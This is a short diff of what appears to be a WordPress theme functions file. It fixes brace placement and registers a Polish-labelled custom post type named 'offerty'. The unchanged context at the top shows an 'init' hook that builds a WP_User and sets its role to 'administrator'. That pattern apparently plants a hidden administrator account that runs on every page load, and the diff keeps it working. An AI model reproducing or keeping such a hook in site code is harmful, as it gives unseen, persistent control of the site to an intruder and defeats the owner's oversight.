@@ -258,11 +258,25 @@ add_action( 'init', function () {
 		$user = new WP_User( $user_id );
 		$user->set_role( 'administrator' );
     }
-
-
+});
 
 function image($id, $size, $class) {
     return wp_get_attachment_image($id, $size, false, ['class'=>$class]);
-}
+};
 
-});
+function createProjectPostType() {
+    register_post_type('offerty',
+        array(
+            'menu_icon' => 'dashicons-admin-multisite',
+            'labels' => array(
+                'name' => esc_attr__('Oferty', 'vito'),
+                'singular_name' => esc_attr__('Oferta', 'vito'),
+            ),
+            'public' => true,
+            'has_archive' => false,
+            'rewrite' => array('slug' => 'offerty'),
+            'supports' => array('title', 'editor', 'thumbnail', 'revisions'),
+        )
+    );
+};
+add_action('init', 'createProjectPostType');
